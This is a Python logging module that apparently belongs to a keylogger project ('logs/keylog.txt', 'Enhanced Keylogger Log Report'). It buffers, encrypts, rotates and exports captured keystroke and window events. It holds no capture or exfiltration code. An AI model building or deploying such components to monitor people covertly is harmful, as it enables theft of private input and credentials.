"""Event logging management with buffering and encryption."""

import os
import time
import json
import threading
import logging
from typing import Any, Dict, List, Optional, Union
from pathlib import Path
from datetime import datetime
from queue import Queue, Empty
from dataclasses import dataclass, field
from .config_manager import ConfigManager
from .encryption_manager import EncryptionManager

logger = logging.getLogger(__name__)


@dataclass
class LogEntry:
    """Represents a single log entry with schema expected by parser/tests."""
    event_type: str
    content: Any
    window_name: str = "Unknown"
    metadata: Dict[str, Any] = field(default_factory=dict)
    timestamp: float = field(default_factory=time.time)
    datetime: str = field(default_factory=lambda: datetime.now().isoformat())
    session_id: Optional[str] = None

    def to_dict(self) -> Dict[str, Any]:
        """Convert entry to dictionary with canonical keys."""
        return {
            'timestamp': self.timestamp,
            'datetime': self.datetime,
            'event_type': self.event_type,
            'content': self.content,
            'window_name': self.window_name,
            'metadata': self.metadata,
            'session_id': self.session_id,
        }

    def to_json(self) -> str:
        """Convert entry to JSON string with numpy type handling."""
        return json.dumps(self.to_dict(), ensure_ascii=False, default=self._json_serializer)
    
    @staticmethod
    def _json_serializer(obj):
        """Custom JSON serializer to handle numpy types and other non-serializable objects."""
        try:
            import numpy as np
            if isinstance(obj, np.bool_):
                return bool(obj)
            elif isinstance(obj, np.integer):
                return int(obj)
            elif isinstance(obj, np.floating):
                return float(obj)
            elif isinstance(obj, np.ndarray):
                return obj.tolist()
        except ImportError:
            pass
        
        # Handle other common non-serializable types
        if hasattr(obj, 'isoformat'):  # datetime objects
            return obj.isoformat()
        elif hasattr(obj, '__dict__'):  # Custom objects
            return str(obj)
        
        # Fallback to string representation
        return str(obj)


class LogEvent(LogEntry):
    """Backward-compatible alias that accepts legacy parameter names."""
    def __init__(self, event_type: str, data: Any, window: str = None, metadata: Dict[str, Any] = None):
        super().__init__(
            event_type=event_type,
            content=data,
            window_name=window or "Unknown",
            metadata=metadata or {},
        )


class _BufferView:
    """Lightweight view to report current buffered (in-memory + queued) events."""
    def __init__(self, manager: 'LoggingManager'):
        self._manager = manager

    def __len__(self) -> int:
        try:
            return len(self._manager.event_buffer) + self._manager.event_queue.qsize()
        except Exception:
            return len(self._manager.event_buffer)


class LoggingManager:
    """Manages event logging with buffering, encryption, and rotation."""
    
    def __init__(self, config_manager: ConfigManager, encryption_manager: EncryptionManager = None):
        self.config = config_manager
        self.encryption = encryption_manager
        
        # Logging configuration
        self.log_file = Path(self.config.get('logging.file_path', 'logs/keylog.txt'))
        self.log_file_path = str(self.log_file)
        self.max_size_mb = self.config.get('logging.max_size_mb', 100)
        self.buffer_size = self.config.get('logging.buffer_size', 100)
        self.flush_interval = self.config.get('logging.flush_interval', 5.0)
        self.enable_rotation = self.config.get('logging.enable_rotation', True)
        # Prefer global encryption flag; fallback to per-logging flag for backward compatibility
        _enc_enabled_global = self.config.get('encryption.enabled', None)
        self.enable_encryption = bool(_enc_enabled_global) if _enc_enabled_global is not None else self.config.get('logging.enable_encryption', True)
        self.backup_count = self.config.get('logging.backup_count', 5)
        
        # Event buffer and processing
        self.event_buffer: List[LogEntry] = []
        self.event_queue = Queue()
        self.buffer_lock = threading.Lock()
        self.is_running = False
        self.buffer = _BufferView(self)
        
        # Statistics
        self.stats = {
            'total_events': 0,
            'events_written': 0,
            'events_encrypted': 0,
            'buffer_flushes': 0,
            'file_rotations': 0,
            'errors': 0,
            'start_time': time.time()
        }
        
        # Session tracking
        self.session_id = self._generate_session_id()
        
        # Ensure log directory exists
        self.log_file.parent.mkdir(parents=True, exist_ok=True)
        
        # Start background processing
        self._start_background_processing()
    
    def _generate_session_id(self) -> str:
        """Generate unique session ID."""
        return f"session_{int(time.time())}_{os.getpid()}"
    
    def _start_background_processing(self) -> None:
        """Start background threads for log processing."""
        self.is_running = True
        
        # Buffer flush thread
        self.flush_thread = threading.Thread(target=self._flush_worker, daemon=True)
        self.flush_thread.start()
        
        # Event processing thread
        self.process_thread = threading.Thread(target=self._process_worker, daemon=True)
        self.process_thread.start()
        
        logger.info("Logging manager background processing started")
    
    def _flush_worker(self) -> None:
        """Background worker for periodic buffer flushing."""
        while self.is_running:
            try:
                time.sleep(self.flush_interval)
                self._flush_buffer()
            except Exception as e:
                logger.error(f"Error in flush worker: {e}")
                self.stats['errors'] += 1
    
    def _process_worker(self) -> None:
        """Background worker for event processing."""
        while self.is_running:
            try:
                # Get event from queue with timeout
                event = self.event_queue.get(timeout=1.0)
                # Append to buffer under lock
                with self.buffer_lock:
                    self.event_buffer.append(event)
                self.event_queue.task_done()
                
                # Auto-flush if needed
                if len(self.event_buffer) >= self.buffer_size:
                    self._flush_buffer()
            except Empty:
                continue
            except Exception as e:
                logger.error(f"Error in process worker: {e}")
                self.stats['errors'] += 1
    
    def _drain_queue_to_buffer(self) -> None:
        """Synchronously drain queued events into the buffer."""
        drained = 0
        while True:
            try:
                event = self.event_queue.get_nowait()
            except Empty:
                break
            else:
                with self.buffer_lock:
                    self.event_buffer.append(event)
                self.event_queue.task_done()
                drained += 1
        # If we reached capacity, flush
        if len(self.event_buffer) >= self.buffer_size:
            self._flush_buffer()
    
    def _maybe_auto_flush(self) -> None:
        """Ensure timely flushing when combined pending items exceed capacity."""
        try:
            combined = len(self.event_buffer) + self.event_queue.qsize()
        except Exception:
            combined = len(self.event_buffer)
        if combined >= self.buffer_size:
            self._drain_queue_to_buffer()
    
    def log_event(self, event_type: str, data: Any, window: str = None, metadata: Dict[str, Any] = None) -> bool:
        """Log an event asynchronously (with synchronous auto-flush assistance)."""
        try:
            event = LogEntry(event_type=event_type, content=data, window_name=window or "Unknown", metadata=metadata or {})
            event.session_id = self.session_id
            
            # Add to queue for processing
            self.event_queue.put(event)
            self.stats['total_events'] += 1
            
            # Help the background worker keep up when needed
            self._maybe_auto_flush()
            
            return True
            
        except Exception as e:
            logger.error(f"Error logging event: {e}")
            self.stats['errors'] += 1
            return False
    
    def _flush_buffer(self) -> bool:
        """Flush event buffer to file."""
        try:
            with self.buffer_lock:
                if not self.event_buffer:
                    return True
                
                events_to_write = self.event_buffer.copy()
                self.event_buffer.clear()
            
            # Check if log rotation is needed
            if self.enable_rotation and self._should_rotate_log():
                self._rotate_log_file()
            
            # Write events to file
            success = self._write_events_to_file(events_to_write)
            
            if success:
                self.stats['events_written'] += len(events_to_write)
                self.stats['buffer_flushes'] += 1
            
            return success
            
        except Exception as e:
            logger.error(f"Error flushing buffer: {e}")
            self.stats['errors'] += 1
            return False

    def flush_buffer(self) -> bool:
        """Public method to flush all pending events (queued + buffered) to disk."""
        try:
            # Wait briefly for queue consumer, then drain any remaining
            self._drain_queue_to_buffer()
            return self._flush_buffer()
        except Exception as e:
            logger.error(f"Error in flush_buffer: {e}")
            self.stats['errors'] += 1
            return False
    
    def _write_events_to_file(self, events: List[LogEntry]) -> bool:
        """Write events to log file."""
        try:
            # Prepare log entries
            log_entries = []
            
            for event in events:
                entry = event.to_json()
                
                # Encrypt if enabled
                if self.enable_encryption and self.encryption and hasattr(self.encryption, 'is_initialized') and self.encryption.is_initialized():
                    # Use available encryption API if present
                    encrypt_fn = getattr(self.encryption, 'encrypt_string', None) or getattr(self.encryption, 'encrypt_data', None)
                    if encrypt_fn:
                        encrypted_entry = encrypt_fn(entry)
                        if encrypted_entry:
                            # If bytes returned, convert to base64/utf-8 string-like
                            if isinstance(encrypted_entry, bytes):
                                try:
                                    encrypted_entry = encrypted_entry.decode('utf-8')
                                except Exception:
                                    encrypted_entry = encrypted_entry.hex()
                            entry = f"ENC:{encrypted_entry}"
                            self.stats['events_encrypted'] += 1
                        else:
                            logger.warning("Failed to encrypt log entry, writing unencrypted")
                
                log_entries.append(entry)
            
            # Write to file
            with open(self.log_file, 'a', encoding='utf-8') as f:
                for entry in log_entries:
                    f.write(entry + '\n')
                f.flush()
                os.fsync(f.fileno())  # Force write to disk
            
            return True
            
        except Exception as e:
            logger.error(f"Error writing events to file: {e}")
            return False
    
    def _should_rotate_log(self) -> bool:
        """Check if log file should be rotated."""
        try:
            if not self.log_file.exists():
                return False
            
            file_size_mb = self.log_file.stat().st_size / (1024 * 1024)
            return file_size_mb >= self.max_size_mb
            
        except Exception:
            return False
    
    def _rotate_log_file(self) -> bool:
        """Rotate log file."""
        try:
            if not self.log_file.exists():
                return True
            
            # Create backup filename with timestamp
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            backup_file = self.log_file.with_name(f"{self.log_file.stem}_{timestamp}.log")
            
            # Move current log to backup
            self.log_file.rename(backup_file)
            
            # Clean up old backups
            self._cleanup_old_backups()
            
            self.stats['file_rotations'] += 1
            logger.info(f"Log file rotated: {backup_file}")
            
            return True
            
        except Exception as e:
            logger.error(f"Error rotating log file: {e}")
            return False
    
    def _cleanup_old_backups(self) -> None:
        """Remove old backup files."""
        try:
            log_dir = self.log_file.parent
            pattern = f"{self.log_file.stem}_*.log"
            
            # Find all backup files
            backup_files = list(log_dir.glob(pattern))
            backup_files.sort(key=lambda x: x.stat().st_mtime, reverse=True)
            
            # Remove excess backups
            for backup_file in backup_files[self.backup_count:]:
                backup_file.unlink()
                logger.info(f"Removed old backup: {backup_file}")
                
        except Exception as e:
            logger.error(f"Error cleaning up old backups: {e}")
    
    def get_stats(self) -> Dict[str, Any]:
        """Get logging statistics."""
        current_time = time.time()
        uptime_hours = (current_time - self.stats['start_time']) / 3600
        
        stats = self.stats.copy()
        stats.update({
            'buffer_size': len(self.event_buffer),
            'queue_size': self.event_queue.qsize(),
            'uptime_hours': uptime_hours,
            'events_per_hour': self.stats['total_events'] / max(uptime_hours, 0.001),
            'log_file_size_mb': self._get_log_file_size_mb(),
            'session_id': self.session_id
        })
        
        return stats
    
    def _get_log_file_size_mb(self) -> float:
        """Get current log file size in MB."""
        try:
            if self.log_file.exists():
                return self.log_file.stat().st_size / (1024 * 1024)
            return 0.0
        except Exception:
            return 0.0
    
    def export_logs(self, output_file: str, format_type: str = 'json', 
                   start_time: float = None, end_time: float = None) -> bool:
        """Export logs to different formats."""
        try:
            # Flush current buffer first
            self.flush_buffer()
            
            # Read and parse log file
            events = self._read_log_file(start_time, end_time)
            
            if not events:
                logger.warning("No events found for export")
                return False
            
            # Export based on format
            if format_type.lower() == 'json':
                return self._export_json(events, output_file)
            elif format_type.lower() == 'csv':
                return self._export_csv(events, output_file)
            elif format_type.lower() == 'text':
                return self._export_text(events, output_file)
            else:
                logger.error(f"Unsupported export format: {format_type}")
                return False
                
        except Exception as e:
            logger.error(f"Error exporting logs: {e}")
            return False
    
    def _read_log_file(self, start_time: float = None, end_time: float = None) -> List[Dict[str, Any]]:
        """Read and parse log file."""
        events = []
        
        try:
            if not self.log_file.exists():
                return events
            
            with open(self.log_file, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    
                    try:
                        # Check if line is encrypted
                        if line.startswith('ENC:'):
                            if self.encryption and hasattr(self.encryption, 'is_initialized') and self.encryption.is_initialized():
                                decrypt_fn = getattr(self.encryption, 'decrypt_string', None) or getattr(self.encryption, 'decrypt_data', None)
                                if decrypt_fn:
                                    decrypted = decrypt_fn(line[4:])
                                    if decrypted and isinstance(decrypted, bytes):
                                        try:
                                            decrypted = decrypted.decode('utf-8')
                                        except Exception:
                                            continue
                                    if decrypted:
                                        event_data = json.loads(decrypted)
                                    else:
                                        continue
                                else:
                                    continue
                            else:
                                continue
                        else:
                            event_data = json.loads(line)
                        
                        # Filter by time range if specified
                        if start_time and event_data.get('timestamp', 0) < start_time:
                            continue
                        if end_time and event_data.get('timestamp', 0) > end_time:
                            continue
                        
                        events.append(event_data)
                        
                    except json.JSONDecodeError:
                        logger.warning(f"Invalid JSON in log line: {line[:100]}...")
                        continue
            
            return events
            
        except Exception as e:
            logger.error(f"Error reading log file: {e}")
            return []
    
    def _export_json(self, events: List[Dict[str, Any]], output_file: str) -> bool:
        """Export events to JSON format with numpy type handling."""
        try:
            with open(output_file, 'w', encoding='utf-8') as f:
                json.dump(events, f, indent=2, ensure_ascii=False, default=LogEntry._json_serializer)
            
            logger.info(f"Exported {len(events)} events to JSON: {output_file}")
            return True
            
        except Exception as e:
            logger.error(f"Error exporting to JSON: {e}")
            return False
    
    def _export_csv(self, events: List[Dict[str, Any]], output_file: str) -> bool:
        """Export events to CSV format."""
        try:
            import csv
            
            if not events:
                return False
            
            # Get all possible field names
            fieldnames = set()
            for event in events:
                fieldnames.update(event.keys())
                if 'metadata' in event and isinstance(event['metadata'], dict):
                    for key in event['metadata'].keys():
                        fieldnames.add(f"metadata_{key}")
            
            fieldnames = sorted(list(fieldnames))
            
            with open(output_file, 'w', newline='', encoding='utf-8') as f:
                writer = csv.DictWriter(f, fieldnames=fieldnames)
                writer.writeheader()
                
                for event in events:
                    row = event.copy()
                    
                    # Flatten metadata
                    if 'metadata' in row and isinstance(row['metadata'], dict):
                        for key, value in row['metadata'].items():
                            row[f"metadata_{key}"] = value
                        del row['metadata']
                    
                    # Convert complex objects to strings
                    for key, value in row.items():
                        if isinstance(value, (dict, list)):
                            row[key] = json.dumps(value)
                    
                    writer.writerow(row)
            
            logger.info(f"Exported {len(events)} events to CSV: {output_file}")
            return True
            
        except Exception as e:
            logger.error(f"Error exporting to CSV: {e}")
            return False
    
    def _export_text(self, events: List[Dict[str, Any]], output_file: str) -> bool:
        """Export events to readable text format."""
        try:
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write("Enhanced Keylogger Log Report\n")
                f.write("=" * 50 + "\n\n")
                
                for event in events:
                    f.write(f"Timestamp: {event.get('datetime', 'Unknown')}\n")
                    f.write(f"Event Type: {event.get('event_type', 'Unknown')}\n")
                    f.write(f"Window: {event.get('window', 'Unknown')}\n")
                    f.write(f"Data: {event.get('data', '')}\n")
                    
                    if event.get('metadata'):
                        f.write(f"Metadata: {json.dumps(event['metadata'], indent=2)}\n")
                    
                    f.write("-" * 30 + "\n\n")
            
            logger.info(f"Exported {len(events)} events to text: {output_file}")
            return True
            
        except Exception as e:
            logger.error(f"Error exporting to text: {e}")
            return False
    
    def stop(self) -> None:
        """Stop logging manager and flush remaining events."""
        try:
            logger.info("Stopping logging manager...")
            self.is_running = False
            
            # Wait for queue to empty
            try:
                self.event_queue.join()
            except Exception:
                pass
            
            # Final buffer flush
            self.flush_buffer()
            
            logger.info("Logging manager stopped")
            logger.info(f"Final stats: {self.get_stats()}")
            
        except Exception as e:
            logger.error(f"Error stopping logging manager: {e}")
    
    def reload_config(self) -> bool:
        """Reload configuration settings."""
        try:
            # Update settings from config
            self.log_file = Path(self.config.get('logging.file_path', 'logs/keylog.txt'))
            self.log_file_path = str(self.log_file)
            self.max_size_mb = self.config.get('logging.max_size_mb', 100)
            self.buffer_size = self.config.get('logging.buffer_size', 100)
            self.flush_interval = self.config.get('logging.flush_interval', 5.0)
            self.enable_rotation = self.config.get('logging.enable_rotation', True)
            # Prefer global encryption flag; fallback to per-logging flag for backward compatibility
            _enc_enabled_global = self.config.get('encryption.enabled', None)
            self.enable_encryption = bool(_enc_enabled_global) if _enc_enabled_global is not None else self.config.get('logging.enable_encryption', True)
            self.backup_count = self.config.get('logging.backup_count', 5)
            
            # Ensure new log directory exists
            self.log_file.parent.mkdir(parents=True, exist_ok=True)
            
            logger.info("Logging manager configuration reloaded")
            return True
            
        except Exception as e:
            logger.error(f"Error reloading logging config: {e}")
            return False

    def get_buffer_entries(self, limit: int = 200, as_dict: bool = False) -> List[Union[str, Dict[str, Any]]]:
        """Return up to `limit` recent in-memory log entries.
        
        If as_dict is False (default), returns a list of strings in the format:
        "YYYY-MM-DD HH:MM:SS: EVENT_TYPE: CONTENT"
        
        If as_dict is True, returns dicts with keys: timestamp, type, message, window, session_id.
        """
        try:
            with self.buffer_lock:
                snapshot = list(self.event_buffer)[-limit:]
            results: List[Union[str, Dict[str, Any]]] = []
            for ev in snapshot:
                try:
                    ts = datetime.fromtimestamp(ev.timestamp).strftime('%Y-%m-%d %H:%M:%S') if isinstance(ev.timestamp, (int, float)) else str(ev.datetime)
                    if as_dict:
                        results.append({
                            'timestamp': ts,
                            'type': ev.event_type,
                            'message': str(ev.content),
                            'window': getattr(ev, 'window_name', 'Unknown') or 'Unknown',
                            'session_id': getattr(ev, 'session_id', None),
                        })
                    else:
                        results.append(f"{ts}: {ev.event_type}: {ev.content}")
                except Exception:
                    # Fall back to JSON if any field access fails
                    try:
                        results.append(ev.to_json() if not as_dict else ev.to_dict())
                    except Exception:
                        continue
            return results
        except Exception:
            return []